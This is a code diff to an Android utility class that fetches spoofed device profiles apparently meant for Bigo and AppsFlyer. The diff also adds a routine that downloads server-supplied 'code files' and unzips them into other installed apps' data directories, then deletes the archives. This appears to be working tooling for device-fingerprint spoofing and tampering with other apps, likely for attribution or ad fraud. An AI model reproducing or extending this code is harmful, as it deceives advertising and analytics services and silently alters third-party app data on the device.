@@ -1,11 +1,12 @@
 package com.example.studyapp.device;
 
+import static com.example.studyapp.autoJS.AutoJsUtil.isAppInstalled;
+
 import android.content.ContentResolver;
 import android.content.Context;
 import android.net.Uri;
 import android.util.Log;
 
-import com.example.studyapp.MainActivity;
 import com.example.studyapp.task.AfInfo;
 import com.example.studyapp.task.BigoInfo;
 import com.example.studyapp.task.DeviceInfo;
@@ -13,8 +14,10 @@ import com.example.studyapp.task.TaskUtil;
 import com.example.studyapp.utils.HttpUtil;
 import com.example.studyapp.utils.ShellUtils;
 
+import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
+import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import org.json.JSONException;
@@ -48,32 +51,81 @@ public class ChangeDeviceInfoUtil {
   // 创建一个线程池用于执行网络任务
   private static final ExecutorService executorService = Executors.newSingleThreadExecutor();
 
-  public static void initialize(String country, int tag, MainActivity mainActivity, String androidId) {
+  public static void initialize(String country, int tag, Context context, String androidId) {
+    Log.d("TaskUtil", "initialize method called with parameters:");
+    Log.d("TaskUtil", "Country: " + country + ", Tag: " + tag + ", Android ID: " + androidId);
+    Log.d("TaskUtil", "Context instance: " + (context != null ? context.getClass().getSimpleName() : "null"));
+
     executorService.submit(() -> {
       try {
+        Log.d("TaskUtil", "Starting network requests...");
+
         // 发起网络请求
         String bigoJson = HttpUtil.requestGet(buildBigoUrl(country, tag));
+        Log.d("TaskUtil", "Received bigoJson: " + bigoJson);
+
         String afJson = HttpUtil.requestGet(buildAfUrl(country, tag));
+        Log.d("TaskUtil", "Received afJson: " + afJson);
+
         String response = executeQuerySafely(androidId);
+        Log.d("TaskUtil", "Response from executeQuerySafely: " + response);
 
         // 解析 JSON
         if (response != null && !response.isBlank() && !response.equals("{}\n")) {
+          Log.d("TaskUtil", "Parsing existing response JSON...");
           JSONObject responseJson = new JSONObject(response);
           bigoDeviceObject = responseJson.optJSONObject("bigoDeviceObject");
           afDeviceObject = responseJson.optJSONObject("afDeviceObject");
+          Log.d("TaskUtil", "Parsed bigoDeviceObject: " + bigoDeviceObject);
+          Log.d("TaskUtil", "Parsed afDeviceObject: " + afDeviceObject);
         } else {
+          Log.d("TaskUtil", "Fallback to parsing bigoJson and afJson...");
           bigoDeviceObject = new JSONObject(bigoJson).optJSONObject("device");
           afDeviceObject = new JSONObject(afJson).optJSONObject("device");
+          Log.d("TaskUtil", "Fallback bigoDeviceObject: " + bigoDeviceObject);
+          Log.d("TaskUtil", "Fallback afDeviceObject: " + afDeviceObject);
         }
 
         // 输出结果
-        Log.d("Debug", "bigoDeviceObject: " + bigoDeviceObject);
-        Log.d("Debug", "afDeviceObject: " + afDeviceObject);
+        Log.i("TaskUtil", "Final bigoDeviceObject: " + bigoDeviceObject);
+        Log.i("TaskUtil", "Final afDeviceObject: " + afDeviceObject);
 
+        // 获取包信息
+        Log.d("TaskUtil", "Fetching package info...");
+        Map<String, String> packageInfo = TaskUtil.getPackageInfo(androidId);
+        Log.d("TaskUtil", "Package info retrieved: " + packageInfo);
+
+        // 遍历包信息并执行逻辑
+        for (String packAgeName : packageInfo.keySet()) {
+          Log.d("TaskUtil", "Processing package: " + packAgeName);
+          if (isAppInstalled(packAgeName)) {
+            Log.d("TaskUtil", "Package installed: " + packAgeName);
+
+            File filesDir = new File(context.getExternalFilesDir(null).getAbsolutePath());
+            Log.d("TaskUtil", "Files directory: " + filesDir.getAbsolutePath());
+
+            File file = TaskUtil.downloadCodeFile(packageInfo.get(packAgeName), filesDir);
+            if (file != null && file.exists()) {
+              Log.d("TaskUtil", "File downloaded: " + file.getAbsolutePath());
+              File destDir = new File("/storage/emulated/0/Android/data/" + packAgeName);
+              Log.d("TaskUtil", "Unzipping to destination: " + destDir.getAbsolutePath());
+
+              TaskUtil.unZip(destDir, file);
+              Log.d("TaskUtil", "Unzip completed. Deleting file: " + file.getAbsolutePath());
+
+              TaskUtil.delFileSh(file.getAbsolutePath());
+              Log.d("TaskUtil", "Temporary file deleted: " + file.getAbsolutePath());
+            } else {
+              Log.w("TaskUtil", "File download failed or file does not exist for package: " + packAgeName);
+            }
+          } else {
+            Log.w("TaskUtil", "Package not installed: " + packAgeName);
+          }
+        }
       } catch (IOException | JSONException e) {
-        Log.e("Error", "Error occurred during initialization", e);
+        Log.e("TaskUtil", "Error occurred during initialization", e);
       } catch (Exception e) {
-        Log.e("Error", "Unexpected error occurred", e);
+        Log.e("TaskUtil", "Unexpected error occurred", e);
       }
     });
   }
